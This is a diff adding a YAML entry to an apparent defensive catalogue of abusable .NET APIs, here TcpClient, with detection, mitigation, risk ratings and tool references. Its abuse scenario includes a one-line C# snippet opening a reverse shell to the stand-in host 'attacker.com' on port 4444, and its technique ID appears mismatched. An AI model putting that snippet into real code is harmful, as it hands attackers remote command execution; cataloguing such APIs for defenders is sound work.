@@ -1,0 +1,44 @@
+id: 65d06cd3-930c-43b7-a847-33d6260203f3
+name: System.Net.Sockets.TcpClient
+category: windows-dotnet-api
+subcategory: network-communication
+api:
+  namespace: System.Net.Sockets
+  language: .NET 1.0+
+  documentation: https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient
+  class: TcpClient
+  method: Connect
+abuse_scenarios:
+- name: Reverse shell establishment
+  technique_id: T1086
+  description: Establish raw TCP connection for reverse shell
+  code_snippet: var tcp = new TcpClient("attacker.com", 4444); var stream = tcp.GetStream();
+    /* execute commands over stream */
+  detection_difficulty: easy
+  common_in_campaigns: true
+detection:
+- vendor: Microsoft Defender
+  effectiveness: medium
+  notes: Behavioral detection based on API patterns
+mitigation:
+- category: monitoring
+  description: Monitor usage of System.Net.Sockets.TcpClient
+  feasibility: easy
+risk:
+  severity: high
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 70
+references:
+  techniques:
+  - T1086
+  tools:
+  - Cobalt Strike
+  - Mimikatz
+tags:
+- windows-dotnet-api
+- network-communication
+- lotl
+author: magicsword-io
+created: '2026-01-31'
+verified: true
